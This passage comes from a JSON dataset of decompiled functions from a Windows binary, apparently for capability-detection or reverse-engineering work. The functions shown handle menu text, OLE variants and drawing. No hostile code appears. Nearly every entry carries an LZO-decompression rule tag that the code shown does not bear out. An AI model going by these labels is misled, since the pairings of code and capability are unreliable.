        "decompiled_code": "\nvoid __cdecl fcn.0042c3b0(int32_t arg_8h, int16_t **arg_ch)\n\n{\n    int16_t **ppiVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t *in_EAX;\n    int16_t *piVar5;\n    int32_t iVar6;\n    char *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t **in_FS_OFFSET;\n    uint uVar9;\n    int32_t *piStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    int32_t *piStack1644;\n    uint uStack1640;\n    uchar *puStack1636;\n    uint32_t var_650h;\n    uint bstrString;\n    int32_t aiStack592 [127];\n    uint *var_50h;\n    uint *var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int16_t **var_40h;\n    int16_t **var_3ch;\n    int16_t **var_38h;\n    int16_t **var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint *var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    \n    puStack1648 = &stack0xfffffffc;\n    puStack1636 = 0x42c3d2;\n    var_24h = in_EAX;\n    fcn.00405fe8();\n    uStack1640 = 0x42c6db;\n    piStack1644 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff994;\n    var_30h = 0;\n    uStack1652 = 0x42c6b8;\n    piStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    var_48h = in_EDX[1];\n    puVar2 = &stack0xfffffffc;\n    puStack1636 = &stack0xfffffffc;\n    if (0x40 < var_48h) {\n        puStack1636 = &stack0xfffffffc;\n        fcn.0040dba8();\n        fcn.00404ec4();\n        puVar2 = puStack1648;\n    }\n    puStack1648 = puVar2;\n    if (var_48h != 0) {\n        var_34h = arg_ch;\n        var_38h = &fcn.0042c3b0::var_650h + var_48h * 4;\n        uVar7 = 0;\n        do {\n            ppiVar1 = var_34h;\n            var_38h = var_38h + -4;\n            var_2ch = in_EDX[uVar7 + 3] & 0x7f;\n            uVar3 = in_EDX[uVar7 + 3] & 0x80;\n            if (var_2ch == 0xa) {\n                *var_38h = 0xa;\n                var_38h[2] = 0x80020004;\n            }\n            else {\n                if (var_2ch == 0x48) {\n                    var_3ch = &fcn.0042c3b0::bstrString + var_30h * 2;\n                    if (uVar3 == 0) {\n                        piVar5 = fcn.0040646c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = NULL;\n                        *var_38h = 0x8;\n                        var_38h[2] = *var_3ch;\n                    }\n                    else {\n                        piVar5 = fcn.0040646c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = *var_34h;\n                        *var_38h = 0x4008;\n                        var_38h[2] = var_3ch;\n                    }\n                    var_30h = var_30h + 1;\n                }\n                else if (uVar3 == 0) {\n                    if (var_2ch == 0xc) {\n                        if (*var_34h == 0x100) {\n                            var_40h = &fcn.0042c3b0::bstrString + var_30h * 2;\n                            piVar5 = fcn.0040646c();\n                            *var_40h = piVar5;\n                            var_40h[1] = NULL;\n                            *var_38h = 0x8;\n                            var_38h[2] = *var_40h;\n                            var_30h = var_30h + 1;\n                        }\n                        else {\n                            *var_38h = *var_34h;\n                            var_38h[1] = ppiVar1[1];\n                            var_38h[2] = ppiVar1[2];\n                            var_38h[3] = ppiVar1[3];\n                            var_34h = var_34h + 3;\n                        }\n                    }\n                    else {\n                        *var_38h = var_2ch;\n                        var_38h[2] = *var_34h;\n                        if ((4 < var_2ch) && (var_2ch < 8)) {\n                            var_34h = var_34h + 1;\n                            var_38h[3] = *var_34h;\n                        }\n                    }\n                }\n                else {\n                    if ((var_2ch == 0xc) && (**var_34h == 0x100)) {\n                        fcn.00411d24();\n                    }\n                    *var_38h = var_2ch | 0x4000;\n                    var_38h[2] = *var_34h;\n                }\n                var_34h = var_34h + 1;\n            }\n            uVar7 = uVar7 + 1;\n        } while (var_48h != uVar7);\n    }\n    var_50h = &fcn.0042c3b0::var_650h;\n    var_4ch = var_28h + 1;\n    var_44h = in_EDX[2];\n    uVar9 = *var_28h;\n    cVar4 = *in_EDX;\n    if (cVar4 == '\\x04') {\n        if ((var_650h & 0xfff) == 9) {\n            cVar4 = '\\b';\n        }\n        *var_28h = 0xfffffffd;\n        var_4ch = var_28h;\n        var_44h = var_44h + 1;\n    }\n    else if (((cVar4 == '\\x01') && (var_48h == 0)) && (arg_8h != 0)) {\n        cVar4 = '\\x03';\n    }\n    iVar6 = (**(*var_24h + 0x18))\n                      (var_24h, uVar9, *0x4924c0, 0, cVar4, &fcn.0042c3b0::var_50h, arg_8h, &fcn.0042c3b0::var_20h, 0);\n    iVar8 = var_30h;\n    if (iVar6 != 0) {\n        fcn.0042c988();\n        iVar8 = var_30h;\n    }\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        if (*(&stack0xfffffdb0 + iVar8 * 8) != 0) {\n            fcn.00406448();\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    iVar8 = var_30h;\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        sub.oleaut32.dll_SysFreeString_1(uVar9, (&fcn.0042c3b0::bstrString)[iVar8 * 2]);\n    }\n    return;\n}\n",
        "token_count": 1801
    },
    "00431574": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431574(uint param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    param_2 = param_2 + 1;\n    fcn.004059dc();\n    fcn.00431410(param_2);\n    return;\n}\n",
        "token_count": 84
    },
    "00433ca8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00433ca8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 <= iVar2) {\n        uVar1 = fcn.004059dc();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.00409b4c();\n        if (iVar2 == 0) {\n            var_5h = 1;\n            fcn.00405a84();\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 220
    },
    "00433d30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433df7)\n\nvoid fcn.00433d30(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = 0x433d49;\n    fcn.004059cc();\n    uStack40 = 0x433e53;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00433ca8();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00433ca8();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00433ca8(),  cVar1 != '\\0')) || (cVar1 = fcn.00433ca8(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar4 = 8;\n        do {\n            fcn.00433ab0();\n            iVar3 = in_EAX;\n            if (in_EAX != 0) {\n                iVar3 = *(in_EAX + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            fcn.004059dc(iVar3, uVar2);\n            uStack44 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1();\n        } while ((iVar3 != 2) && (iVar4 = iVar4 + 1,  iVar4 != 0x256));\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x433e5a;\n    uStack40 = 0x433e4a;\n    fcn.00405530();\n    uStack40 = 0x433e52;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 489
    },
    "00434a54": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00434aa0)\n// WARNING: Removing unreachable block (ram,0x00434aaa)\n\nvoid __cdecl fcn.00434a54(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack52 = 0x434c40;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.00436ad0();\n    if ((iVar2 != 0) && (cVar1 = fcn.00438350(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.004055c8();\n    uVar6 = (arg_8h & 0x400) == 0;\n    if ((!uVar6) &&\n       ((uVar6 = var_4h == NULL,  uVar6 || ((uVar6 = *var_4h == '&',  uVar6 && (uVar6 = var_4h[1] == '\\0',  uVar6))))))\n    {\n        fcn.00405818();\n    }\n    fcn.00405974();\n    if (uVar6) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.00425694(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x00434c2a;\n    }\n    fcn.00425054();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.004249fc();\n        fcn.00424a08();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.0042467c();\n            pcVar5 = var_4h;\n            if (var_4h != NULL) {\n                pcVar5 = *(var_4h + -4);\n            }\n            uVar3 = fcn.004059dc(pcVar5, lprc, arg_8h);\n            uVar3 = fcn.00425694(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        if (arg_ch != '\\0') {\n            iVar2 = fcn.004241b0();\n            iVar4 = fcn.004241b0();\n            if (iVar2 == iVar4) {\n                fcn.0042467c();\n                goto code_r0x00434c01;\n            }\n        }\n        fcn.0042467c();\n    }\ncode_r0x00434c01:\n    pcVar5 = var_4h;\n    if (var_4h != NULL) {\n        pcVar5 = *(var_4h + -4);\n    }\n    uVar3 = fcn.004059dc(pcVar5, lprc, arg_8h);\n    uStackY120 = fcn.00425694(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x00434c2a:\n    *in_FS_OFFSET = uStackY120;\n    fcn.00405530(0x434c47);\n    return;\n}\n",
        "token_count": 964
    },
    "00436f7c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436f7c(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffb8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    uStack44 = 0x4370bf;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = '\\0';\n    var_10h = *in_EAX;\n    iVar2 = var_10h;\n    if (var_10h != 0) {\n        iVar2 = *(var_10h + -4);\n    }\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x4927c0 + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                var_9h = '\\x01';\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    var_8h = param_1;\n    var_4h = param_2;\n    if (var_9h == '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (param_1 != 0) {\n            fcn.00405acc();\n            puVar1 = puStack40;\n        }\n    }\n    else {\n        var_10h = *in_EAX;\n        iVar2 = var_10h;\n        if (var_10h != 0) {\n            iVar2 = *(var_10h + -4);\n        }\n        uVar5 = iVar2 == 2;\n        puStack40 = &stack0xfffffffc;\n        fcn.00405a44(&var_14h);\n        fcn.00405974();\n        if (uVar5) {\n            var_10h = *in_EAX;\n            fcn.00405a44(&var_18h);\n            in_stack_ffffffb8 = var_4h;\n            fcn.004058e0(0x4370d4, 0x4370f8, var_4h, 0x4370ec, 0x4370e0, var_18h);\n            puVar1 = puStack40;\n        }\n        else {\n            in_stack_ffffffb8 = 0x4370f8;\n            fcn.004058e0(0x4370f8, var_4h, 0x4370ec, 0x4370e0, *in_EAX);\n            puVar1 = puStack40;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405554(0x4370c6);\n    return;\n}\n",
        "token_count": 777
    },
    "004370fc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004370fc(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint *var_34h;\n    uint uStack52;\n    int32_t *var_2ch;\n    uchar auStack44 [3];\n    uint var_25h;\n    int32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x8;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x437584;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004370fc::var_25h + 1;\n    _auStack44 = CONCAT13(param_2, auStack44) & 0xff00ffff;\n    puVar1 = &stack0xfffffffc;\n    var_18h = unaff_EDI;\n    if (var_25h == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            _auStack44 = 0x43713d;\n            cVar2 = fcn.0043773c();\n            puVar1 = var_1ch;\n            if (cVar2 != '\\0') goto code_r0x00437145;\n        }\n        *in_FS_OFFSET = stack0xffffffd8;\n        var_1ch = 0x43758b;\n        var_20h = 0x43756e;\n        fcn.00405554();\n        var_20h = 0x43757b;\n        fcn.00405554();\n        var_20h = 0x437583;\n        fcn.00405530();\n        return;\n    }\ncode_r0x00437145:\n    var_1ch = puVar1;\n    _auStack44 = 0x437153;\n    fcn.004055c8();\n    var_ch = NULL;\n    var_14h = NULL;\n    var_8h = NULL;\n    var_10h = 0;\n    var_2ch = 0x43754d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_34h = 0x437186;\n    _auStack44 = &stack0xfffffffc;\n    var_ch = fcn.00404620();\n    var_34h = 0x437195;\n    var_14h = fcn.00404620();\n    var_34h = 0x4371a4;\n    var_2ch = fcn.00404620();\n    var_34h = 0x4371b3;\n    var_8h = fcn.00404620();\n    var_34h = 0x4371bd;\n    iVar3 = fcn.00436510();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x4371d5;\n            iVar3 = fcn.00436520();\n            uVar7 = *(iVar3 + 0x3e) == '\\0';\n            if (!uVar7) {\n                var_34h = 0x4371e8;\n                fcn.00436520();\n                var_34h = 0x4371f5;\n                fcn.00405974();\n                if (!uVar7) {\n                    var_34h = 0x437204;\n                    iVar3 = fcn.00436520();\n                    if (*(iVar3 + 0x30) != 0) {\n                        var_34h = 0x437217;\n                        fcn.00436520();\n                        var_34h = 0x437222;\n                        fcn.004392f4();\n                        var_34h = 0x43722d;\n                        fcn.004097cc();\n                        if (var_1ch == NULL) {\n                            var_34h = 0x43723c;\n                            var_34h = fcn.00436520();\n                            var_38h = 0x437246;\n                            fcn.00436520();\n                            var_38h = 0x437253;\n                            (**(*var_2ch + 100))();\n                        }\n                        else {\n                            var_34h = 0x437263;\n                            iVar3 = fcn.0040e8bc();\n                            if (iVar3 != 0) {\n                                var_38h = 0x437270;\n                                var_34h = &stack0xfffffffc;\n                                cVar2 = fcn.00436ec8(&stack0xfffffffc);\n                                if (cVar2 == '\\0') {\n                                    var_34h = 0x43727e;\n                                    iVar3 = fcn.00436520();\n                                    var_34h = iVar3 + 0x30;\n                                    var_38h = 0x43728b;\n                                    fcn.00436520();\n                                    var_38h = 0x437296;\n                                    fcn.00439204();\n                                    var_34h = 0x43729f;\n                                    fcn.00405584();\n                                    var_34h = 0x4372a8;\n                                    var_34h = fcn.00436520();\n                                    var_38h = 0x4372b2;\n                                    fcn.00436520();\n                                    var_38h = 0x4372bf;\n                                    (**(*var_2ch + 100))();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        } while (var_34h != 0x1);\n    }\n    var_34h = 0x4372d4;\n    fcn.004055c8();\n    var_34h = 0x4372dc;\n    iVar3 = (**(*var_2ch + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x4372f4;\n            fcn.004055c8();\n            var_34h = 0x4372ff;\n            (**(*var_14h + 8))();\n            var_34h = 0x437307;\n            (**(*var_ch + 0x44))();\n            var_34h = 0x43730f;\n            iVar3 = (**(*var_14h + 0x14))();\n            iVar3 = iVar3 + -1;\n            if (-1 < iVar3) {\n                do {\n                    var_34h = 0x437328;\n                    (**(*var_14h + 0xc))();\n                    iVar6 = 1;\n                    while( true ) {\n                        var_34h = 0x4373cc;\n                        iVar5 = fcn.0040580c();\n                        if (iVar5 < iVar6) break;\n                        uVar4 = *(var_20h + -1 + iVar6);\n                        if ((*(*0x4927c0 + (uVar4 >> 3)) >> (uVar4 & 7) & 1) == 0) {\n                            var_34h = &fcn.004370fc::var_40h;\n                            var_38h = 0x43735e;\n                            fcn.00405a44();\n                            var_38h = 0x437369;\n                            fcn.004097cc();\n                            var_3ch = 0x437372;\n                            var_38h = &stack0xfffffffc;\n                            cVar2 = fcn.00436ec8(&stack0xfffffffc);\n                            if (cVar2 != '\\0') {\n                                if (*(*0x4927e0 + 0xc) == '\\0') {\n                                    var_38h = 0x4373a0;\n                                    fcn.00405acc();\n                                }\n                                else {\n                                    var_38h = 0x43738f;\n                                    fcn.00436f7c();\n                                }\n                                var_38h = 0x4373aa;\n                                (**(*var_14h + 0x18))();\n                                var_38h = 0x4373b7;\n                                (**(*var_ch + 0x3c))();\n                                var_38h = 0x4373c1;\n                                (**(*var_14h + 0x48))();\n                                break;\n                            }\n                        }\n                        else {\n                            iVar6 = iVar6 + 1;\n                        }\n                        iVar6 = iVar6 + 1;\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_34h = 0x4373e6;\n            iVar3 = (**(*var_ch + 0x14))();\n            if (var_10h < iVar3) {\n                var_38h = 0x4373f1;\n                var_34h = &stack0xfffffffc;\n                fcn.00436ef8(&stack0xfffffffc);\n            }\n            var_34h = 0x4373fa;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (iVar3 < 1) break;\n            var_34h = 0x437406;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (-1 < iVar3 + -1) {\n                do {\n                    var_34h = 0x43741a;\n                    (**(*var_14h + 0x18))();\n                    var_34h = 0x437424;\n                    (**(*var_2ch + 0x5c))();\n                    var_34h = 0x43742e;\n                    (**(*var_2ch + 0x14))();\n                    var_34h = 0x43743b;\n                    (**(*var_2ch + 0x70))();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        } while (var_34h != 0x1);\n    }\n    if (var_10h == 0) {\n        var_38h = 0x437454;\n        var_34h = &stack0xfffffffc;\n        fcn.00436ef8(&stack0xfffffffc);\n    }\n    var_34h = 0x43745d;\n    iVar3 = (**(*var_8h + 0x14))();\n    auStack44 = CONCAT12(0 < iVar3, auStack44._0_2_);\n    _auStack44 = _auStack44 & 0xff000000 | auStack44;\n    var_34h = 0x43746b;\n    iVar3 = (**(*var_8h + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x437487;\n            (**(*var_8h + 0xc))();\n            if (*(*0x4927e0 + 0xc) != '\\0') {\n                var_34h = 0x43749f;\n                iVar3 = fcn.0040e8bc();\n                if ((iVar3 == 0) && (var_18h != 0)) {\n                    var_34h = 0x4374b6;\n                    iVar3 = fcn.0040e8bc();\n                    if (iVar3 == 0) {\n                        var_34h = &fcn.004370fc::var_44h;\n                        var_38h = 0x4374d9;\n                        fcn.00405a44();\n                        var_38h = 0x4374e6;\n                        fcn.00436f7c();\n                        var_38h = 0x437500;\n                        fcn.00405a84();\n                    }\n                }\n            }\n            var_34h = 0x43750a;\n            (**(*var_8h + 0x18))();\n            var_34h = 0x437515;\n            fcn.00405584();\n            var_34h = var_34h + -1;\n        } while (var_34h != NULL);\n    }\n    *in_FS_OFFSET = uStack52;\n    _auStack44 = 0x437554;\n    var_2ch = 0x437534;\n    fcn.00404650();\n    var_2ch = 0x43753c;\n    fcn.00404650();\n    var_2ch = 0x437544;\n    fcn.00404650();\n    var_2ch = 0x43754c;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 3019
    },
    "004383c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x0043845a)\n// WARNING: Removing unreachable block (ram,0x00438472)\n\nvoid __cdecl fcn.004383c4(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack44 = &var_2h + 2;\n    uStack48 = 0x4384ef;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.00437994();\n        if ((iVar1 != 0) && (iVar2 = fcn.00436510(),  in_ECX < iVar2)) {\n            iVar1 = fcn.00436520();\n        }\n    }\n    else {\n        puStack44 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.00437994();\n        uStack60 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00405718();\n        fcn.00405718();\n        fcn.00405718(0);\n        uVar3 = fcn.004059dc();\n        fcn.00405718(0, uVar3);\n        uVar3 = fcn.004059dc();\n        iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar3);\n        if (iVar1 == 2) {\n            fcn.004392f4();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x4384f6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 521
    },
    "00439204": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439204(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    fcn.00405584();\n    for (iVar3 = 1; iVar2 = fcn.0040580c(),  iVar3 <= iVar2; iVar3 = iVar3 + 1) {\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x4927c0 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (*(*param_2 + -1 + iVar3) == '&') {\n                if (*(*0x4927e0 + 0xc) == '\\0') {\n                    bVar4 = false;\n                }\n                else {\n                    if (iVar3 < 2) {\n                        bVar4 = false;\n                    }\n                    else {\n                        iVar2 = *param_2;\n                        if (iVar2 != 0) {\n                            iVar2 = *(iVar2 + -4);\n                        }\n                        bVar4 = 1 < iVar2 - iVar3;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + -2 + iVar3) == '(';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + 1 + iVar3) == ')';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                }\n                if (bVar4) {\n                    fcn.00405a84();\n                }\n                else {\n                    fcn.00405a84();\n                }\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 412
    },
    "004392f4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004392f4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.00405530();\n    iVar3 = 1;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x4927c0 + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00405718();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "0043935c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004393a6)\n// WARNING: Removing unreachable block (ram,0x004393b2)\n\nvoid fcn.0043935c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4393ff;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.00439204();\n    fcn.00439204();\n    uVar1 = fcn.004059dc(0);\n    uVar1 = fcn.004059dc(0, uVar1);\n    uVar2 = 0x400;\n    sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x439406);\n    return;\n}\n",
        "token_count": 261
    },
    "0043c214": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c214(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x43c3ee\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.0043c58c();\n            break;\n        case 1:\n            fcn.0043c58c();\n            break;\n        case 2:\n            fcn.0043c11c();\n            fcn.0043c58c();\n            break;\n        case 3:\n            fcn.0043c11c();\n            fcn.0043c58c();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.0043c58c();\n            }\n            else {\n                fcn.0043c1b4(&stack0xfffffffc);\n                fcn.0043c58c();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.0043c58c();\n                }\n                else {\n                    fcn.0043c1b4(&stack0xfffffffc);\n                    fcn.0043c58c();\n                }\n            }\n            break;\n        case 6:\n            fcn.0043c58c();\n            break;\n        case 7:\n            fcn.0043c58c();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar3 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar3;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar3 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar3;\n        }\n        else {\n            iVar3 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n            iVar2 = sub.kernel32.dll_GetTickCount_1();\n            if 